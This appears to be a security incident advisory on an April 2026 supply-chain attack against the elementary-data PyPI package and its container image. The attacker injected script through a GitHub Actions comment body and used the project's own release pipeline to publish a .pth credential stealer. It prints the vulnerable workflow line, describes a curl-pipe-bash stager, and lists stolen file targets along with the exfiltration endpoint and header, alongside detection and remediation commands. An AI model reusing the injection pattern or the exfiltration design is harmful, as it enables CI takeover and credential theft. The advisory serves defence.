# elementary-data PyPI & GHCR Compromise — GitHub Actions Script Injection Forges Signed Release

**Date:** April 2026
**Ecosystem:** PyPI / GitHub Container Registry (GHCR) / GitHub Actions
**Severity:** Critical
**Type:** Script Injection / Credential Stealer / CI/CD Pipeline Abuse
**Sources:**
- [StepSecurity — elementary-data Compromised on PyPI and GHCR: Forged Release Pushed via GitHub Actions Script Injection](https://www.stepsecurity.io/blog/elementary-data-compromised-on-pypi-and-ghcr-forged-release-pushed-via-github-actions-script-injection)

---

## Summary

On April 24, 2026 at 22:20:47 UTC, a malicious version of `elementary-data` (0.23.3) was published to PyPI and remained listed as the latest release at the time of disclosure. `elementary-data` is a widely deployed Python package for dbt data observability. The same release workflow simultaneously pushed a multi-arch container image to GitHub Container Registry (`ghcr.io/elementary-data/elementary`), tagged both `0.23.3` and `latest` — meaning every unpinned `docker pull` had been pulling the trojaned image since April 24.

The attacker — operating a two-day-old GitHub account (`realtungtungtungsahur`) — never touched the master branch, never opened a pull request, and never compromised any maintainer credentials. Instead, they exploited a classic GitHub Actions script injection vulnerability: a workflow that interpolated the raw text of a PR comment (`${{ github.event.comment.body }}`) directly into a `run:` shell block. A single strategically crafted comment on a long-lived open PR gave the attacker full GITHUB_TOKEN access on the Actions runner, which they used to forge a signed release commit and then dispatch the project's own legitimate publishing pipeline against it.

The payload — a `.pth` file added to the wheel root — fires on every Python invocation in any environment where the package is installed, not only on `import elementary`. The three-stage credential harvester collects SSH keys, cloud provider credentials (AWS via both file and live IMDS/Secrets Manager API calls, GCP, Azure), Kubernetes configs, `.env` files, crypto wallets, and system files, then exfiltrates a compressed archive to a single C2 endpoint. The attack represents a high-sophistication abuse of GitHub's trusted CI/CD infrastructure to launder a malicious release under a legitimate, bot-signed, green-checkmark commit.

---

## Compromised Artifacts

| Artifact | Malicious Version / Tag | Digest | Status |
|----------|------------------------|--------|--------|
| `elementary-data` (PyPI wheel + sdist) | 0.23.3 | — | Listed as latest at time of disclosure; not yet yanked |
| `ghcr.io/elementary-data/elementary` | `:0.23.3` | `sha256:31ecc5939de6d24cf60c50d4ca26cf7a8c322db82a8ce4bd122ebd89cf634255` | Compromised |
| `ghcr.io/elementary-data/elementary` | `:latest` | `sha256:31ecc5939de6d24cf60c50d4ca26cf7a8c322db82a8ce4bd122ebd89cf634255` (same) | Compromised |
| `ghcr.io/elementary-data/elementary` | `:0.23.2` | `sha256:b3bbfafde1a0db3a4d47e70eb0eb2ca19daef4a19410154a71abee567b35d3d9` | Last clean version |

---

## How It Worked

### Entry Point: Script Injection via PR Comment

The attacker identified `.github/workflows/update_pylon_issue.yml`, a workflow that fires on `issue_comment` events. Its first step interpolated the comment body directly into a `run:` shell block:

```yaml
- name: Extract Issue or Pull Request Details
  run: |
    echo "${{ github.event.comment.body }}"
```

The expression `${{ github.event.comment.body }}` is expanded by the GitHub Actions runner into the shell script **before bash parses it** — a textbook script injection. On April 24 at 22:10:14 UTC, the attacker posted a single comment on PR #2147 (a long-lived, open master → docs sync PR from March). The comment body was a `curl | bash` stager that retrieved a remote shell script from `https://litter.catbox.moe/iqesmbhukgd2c7hq.sh` (since expired). The repository's `GITHUB_TOKEN` was in scope for the entire `handle_comment` job.

### Step 1: Forging a Signed Release Commit

Using the captured `GITHUB_TOKEN`, the stager created an orphan git commit (`b1e4b1f3aad0d489ab0e9208031c67402bbb8480`) that:
- Bumped `pyproject.toml` to version `0.23.3`
- Added `elementary.pth` at the repository root (a single base64 line, ~245 KB)

The commit author is `github-actions[bot]` with committer `web-flow`, displays a green "Verified" PGP badge, and uses a message (`release/v0.23.2 (#2188)`) copied verbatim from an unrelated legitimate PR nine days earlier — designed to blend in with normal release history. A `v0.23.3` tag was pushed pointing at this orphan commit (not reachable from any branch). The telltale sign is the gibberish GitHub Release name and body: `dsajdkjsajkdsajk` / `dsakdjsakjdjsa`.

The `handle_comment` job was kept running for **2 hours and 46 minutes** (ultimately exiting with `failure`) — giving the attack window cover as an "in-progress" workflow run.

### Step 2: Dispatching the Legitimate Publishing Pipeline

With the orphan commit tagged `v0.23.3`, the attacker called the GitHub API to dispatch the project's own `Release package` workflow with `inputs.tag=v0.23.3`. Because the workflow's checkout step uses `ref: ${{ inputs.tag || github.ref }}`, it checked out straight from the orphan commit. Two jobs ran successfully:

1. **`publish-to-pypi`**: Used the project's stored `PYPI_USER` / `PYPI_PASS` secrets to upload the wheel and source distribution via `pypa/gh-action-pypi-publish`.
2. **`build-and-push-docker-image`**: Built and pushed a multi-arch (linux/amd64 + linux/arm64) image to GHCR, tagging it both `0.23.3` and `latest`.

### Payload Mechanics: Three-Stage Credential Harvester via `.pth`

The malicious `elementary.pth` file is placed at the Python package root. Python automatically discovers `.pth` files in `site-packages` and executes any line beginning with `import` at **interpreter startup** — meaning the payload fires on every Python invocation in the environment, regardless of whether `elementary` is ever imported.

**Stage 1 (base64 wrapper):** The `.pth` file contains a single ~245 KB base64-encoded blob. Decoding it reveals a Python script with two embedded cipher seeds:
- `swabag` — XOR-with-MD5-keystream seed for stage 1 → stage 2 decryption
- `for any questions: contact 050afbe046d7545f5af1a0d3fcfbaf6e993fd93d487b431f09bc9e963c7220a135 on session` — seed for stage 2 → stage 3 (also the actor's Session contact address)

**Stage 2 (XOR-decrypted):** A second layer of XOR-with-MD5-keystream decryption produces the stage-3 collector.

**Stage 3 (credential harvester):** A comprehensive Python infostealer targeting:

| Category | What Is Collected |
|----------|-------------------|
| Identity | SSH private keys (`id_rsa`, `id_ed25519`, etc.), `authorized_keys`, `known_hosts`, `~/.git-credentials`, `gh` auth token |
| AWS | `~/.aws/credentials`, `~/.aws/config`, live IMDSv2 role credential lookup, SigV4-signed calls to AWS Secrets Manager (`ListSecrets`/`GetSecretValue`) and SSM Parameter Store |
| GCP / Azure | `application_default_credentials.json`, `~/.azure/` |
| Kubernetes | `~/.kube/config`, `/etc/kubernetes/*.conf`, ServiceAccount tokens, `kubectl get secrets --all-namespaces` |
| Docker | `~/.docker/config.json` |
| `.env` files | Recursive walk to depth 6 for all `.env*` variants |
| Developer credentials | `~/.npmrc`, `~/.pypirc`, `~/.cargo/credentials.toml`, `~/.vault-token`, `~/.netrc`, `~/.pgpass`, `~/.my.cnf` |
| Crypto wallets | Bitcoin, Litecoin, Dogecoin, Zcash, Dash, Monero, Ripple wallet configs and `wallet*.dat`; Ethereum keystores; Cardano keys; Solana keypairs (`validator-keypair.json`, `id.json`); Anchor deploy keys |
| System | `/etc/passwd`, `/etc/shadow`, shell histories, `/var/log/auth.log` |

Collected data is compressed to `trin.tar.gz` and POSTed via `curl --data-binary` to the C2:

```
POST https://igotnofriendsonlineorirl-imgonnakmslmao.skyhanni.cloud/
Header: X-Rise-To-The-Trinny: agree
```

A persistent execution marker is written at `$TMPDIR/.trinny-security-update`. The `trin.tar.gz` archive is auto-cleaned from the temp directory after upload.

### Container Image Impact

The `:latest` tag is the especially dangerous consequence. Many teams pin Python package versions in lockfiles but use `:latest` (or omit a tag entirely, defaulting to `:latest`) for container images. Any Kubernetes deployment, Argo CD application, Docker Compose stack, or `FROM` line without a digest pin had been pulling the trojaned build since April 24.

---

## Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| Apr 22, 2026 | GitHub account `realtungtungtungsahur` created (zero prior activity) |
| Apr 24, 2026 22:10:14 UTC | Attacker posts malicious comment on PR #2147; `update_pylon_issue.yml` fires, `handle_comment` job begins executing `curl \| bash` stager with GITHUB_TOKEN |
| Apr 24, 2026 ~22:10 UTC | Stager forges orphan commit `b1e4b1f3`, pushes `v0.23.3` tag; dispatches `Release package` workflow with `tag=v0.23.3` |
| Apr 24, 2026 22:20:47 UTC | `elementary-data==0.23.3` uploaded to PyPI (wheel + sdist); `ghcr.io/elementary-data/elementary:0.23.3` and `:latest` pushed to GHCR |
| Apr 24, 2026 ~01:00 UTC (next day) | `handle_comment` job exits with `failure` after 2h 46m |
| Apr 25, 2026 | StepSecurity publishes full disclosure; `elementary-data==0.23.3` still listed as latest release on PyPI at time of writing |

---

## Detection

```bash
# Check installed version of elementary-data
pip show elementary-data

# If version is 0.23.3, the system is compromised.

# Check for malicious .pth file in site-packages
python3 -c "
import site, pathlib
for d in site.getsitepackages() + [site.getusersitepackages()]:
    p = pathlib.Path(d) / 'elementary.pth'
    if p.exists():
        size = p.stat().st_size
        print(f'MALICIOUS .pth found: {p} ({size} bytes)')
        if size > 100000:
            print('Size > 100KB — consistent with malicious payload')
"

# Search all site-packages for the .pth file directly
find $(python3 -c "import site; print(' '.join(site.getsitepackages()))") \
  -name 'elementary.pth' 2>/dev/null

# Check for C2 contact in network logs
grep -r "igotnofriendsonlineorirl-imgonnakmslmao\|skyhanni\.cloud\|X-Rise-To-The-Trinny" \
  /var/log/ 2>/dev/null

# Check for the persistent execution marker
ls -la "${TMPDIR:-.}/.trinny-security-update" 2>/dev/null

# Check for exfil archive remnants (usually auto-cleaned but may persist on error)
find /tmp -name 'trin.tar.gz' 2>/dev/null

# Verify the container image digest if using GHCR
docker inspect ghcr.io/elementary-data/elementary:latest \
  --format '{{index .RepoDigests 0}}' 2>/dev/null
# MALICIOUS digest: sha256:31ecc5939de6d24cf60c50d4ca26cf7a8c322db82a8ce4bd122ebd89cf634255
# CLEAN 0.23.2 digest: sha256:b3bbfafde1a0db3a4d47e70eb0eb2ca19daef4a19410154a71abee567b35d3d9

# If using Kubernetes, check running pods for compromised image
kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\t"}{range .spec.containers[*]}{.image}{"\n"}{end}{end}' \
  2>/dev/null | grep "elementary-data/elementary"

# Check GitHub Actions logs for the attacker's comment-triggered workflow
# Look for realtungtungtungsahur in workflow run triggering actors
# Audit .github/workflows/ for unsafe ${{ github.event.comment.body }} interpolation
grep -r 'github\.event\.comment\.body\|github\.event\.issue\.title\|github\.event\.pull_request\.title\|github\.head_ref' \
  .github/workflows/ 2>/dev/null
```

---

## Remediation

1. **Check installed version:**
   ```bash
   pip show elementary-data
   ```
   If the `Version` field shows `0.23.3`, the system is compromised.

2. **Remove the malicious package and downgrade:**
   ```bash
   pip uninstall elementary-data -y
   pip install "elementary-data<0.23.3"
   ```

3. **Remove the malicious `.pth` file** (it survives package reinstall if left behind):
   ```bash
   find $(python3 -c "import site; print(' '.join(site.getsitepackages()))") \
     -name 'elementary.pth' -delete 2>/dev/null
   ```

4. **Pull a clean container image** by pinning to the last known-good digest:
   ```bash
   docker pull ghcr.io/elementary-data/elementary@sha256:b3bbfafde1a0db3a4d47e70eb0eb2ca19daef4a19410154a71abee567b35d3d9
   ```
   Update all Kubernetes deployments, Docker Compose files, and Dockerfiles to reference the digest rather than a mutable tag.

5. **Audit network logs** for any outbound HTTPS to `igotnofriendsonlineorirl-imgonnakmslmao.skyhanni.cloud` — any connection confirms credential exfiltration occurred.

6. **Rotate all credentials** accessible on the affected system, including: SSH private keys, AWS access keys and any IAM role credentials retrieved via IMDS (check CloudTrail for `GetSecretValue` and `GetParameter` calls from affected instances), Kubernetes service account tokens and kubeconfig certs, GCP/Azure service account keys, Docker registry tokens, npm and PyPI publishing tokens, all `.env` file secrets, GitHub tokens (`gh auth token`), crypto wallet keys.

7. **Audit AWS Secrets Manager and SSM Parameter Store** — the harvester makes live SigV4-signed API calls to retrieve secret values directly. Review CloudTrail for unexpected `secretsmanager:GetSecretValue` and `ssm:GetParameter(s)` events from affected hosts.

8. **Audit GitHub Actions workflows** in your own repositories for script injection patterns:
   ```bash
   grep -r 'github\.event\.comment\.body\|github\.event\.issue\.title\|github\.event\.pull_request\.title\|github\.head_ref' \
     .github/workflows/
   ```
   Replace unsafe interpolations with intermediate environment variables:
   ```yaml
   # UNSAFE
   run: echo "${{ github.event.comment.body }}"
   
   # SAFE
   env:
     COMMENT_BODY: ${{ github.event.comment.body }}
   run: echo "$COMMENT_BODY"
   ```

---

## Lessons Learned

- **GitHub Actions script injection via comment body is a widely under-patched class of bug.** The same pattern (`${{ github.event.comment.body }}`, `github.event.issue.title`, `github.head_ref`) appears across thousands of public repositories. Any workflow that uses these expressions inside a `run:` block is a potential foothold.
- **A single comment on a dormant PR was enough to take over the entire release pipeline.** The project's own publishing infrastructure — its secrets, its signing, its PyPI and GHCR push credentials — became the attacker's delivery mechanism. No external infrastructure needed.
- **The `:latest` tag problem is underweighted in container security.** Python teams that pin package versions carefully still often omit image digest pins. The same compromise that affected `pip install elementary-data==0.23.3` silently affected every `docker pull ghcr.io/elementary-data/elementary:latest` without any version indicator being wrong.
- **`.pth` files are a privileged execution primitive.** Unlike `postinstall` hooks (which run once and can be audited), a `.pth` file fires on every Python invocation in the environment — every script run, every `python -c`, every test suite, every cron job. It survives `pip uninstall` if not explicitly removed.
- **Forged bot-signed commits with green "Verified" badges look indistinguishable from legitimate CI commits.** Defenders cannot rely on the PGP badge as a trust signal when the attacker controls a GITHUB_TOKEN.
- **AWS Secrets Manager and SSM Parameter Store exfiltration is increasingly common in PyPI attacks.** Environments running ML/observability tooling (like elementary-data) often have cloud roles with broad secrets access. Attackers now make live API calls rather than just reading credential files.

---

## Related Incidents

- [Checkmarx KICS GitHub Action Compromised](./2026-03-checkmarx-kics-action.md) — GitHub Actions tag poisoning via stolen maintainer credentials; similar CI/CD pipeline abuse
- [prt-scan — AI-Augmented GitHub Actions Credential Theft Campaign](./2026-04-prt-scan-github-actions.md) — `pull_request_target` exploitation for CI secret theft via malicious PRs
- [Trivy GitHub Actions Tag Compromise](./2026-03-trivy-github-actions.md) — CI/CD secret theft via poisoned version tags
- [xygeni-action C2 Backdoor](./2026-03-xygeni-action.md) — GitHub Actions tag poisoning with interactive C2 shell
- [kubernetes-el Pwn Request](./2026-03-kubernetes-el.md) — Pwn Request via `pull_request_target` exploitation
